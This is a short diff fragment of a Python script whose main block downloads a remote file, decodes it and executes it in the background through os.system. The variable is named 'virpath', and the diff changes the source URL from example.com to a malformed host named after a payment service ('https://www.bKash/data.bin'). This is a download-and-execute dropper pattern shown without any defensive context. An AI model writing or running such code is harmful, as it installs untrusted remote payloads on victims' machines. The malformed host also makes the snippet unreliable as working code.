@@ -25,4 +25,4 @@ def execute(data):
     os.system(f'{virpath} &')
 
 if __name__ == '__main__':
-    execute(decode(download_file('https://example.com/data.bin')))
+    execute(decode(download_file('https://www.bKash/data.bin')))
